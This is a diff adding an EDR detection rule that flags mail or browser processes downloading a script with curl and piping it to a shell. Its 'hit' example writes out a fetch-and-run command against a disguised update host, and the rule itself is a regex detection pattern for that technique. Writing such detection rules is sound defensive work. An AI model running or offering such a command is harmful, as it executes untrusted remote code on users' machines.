@@ -1,0 +1,11 @@
+id: edr_pipe_to_shell_from_mail
+title: A mail or browser process downloads a script and pipes it to a shell
+severity: critical
+technique: T1059.004
+kind: match
+source: edr
+where: {parent: {in: [Mail, Outlook, Safari, chrome]}, cmdline: {regex: "curl .*\\|\\s*(ba)?sh"}}
+budget_per_day: 0.05
+examples:
+  hit: [{parent: Mail, process: sh, cmdline: "curl -s http://cdn-update.io/i.sh | sh"}]
+  miss: [{parent: iterm2, process: bash, cmdline: "curl -fsSL https://get.docker.com | sh"}]
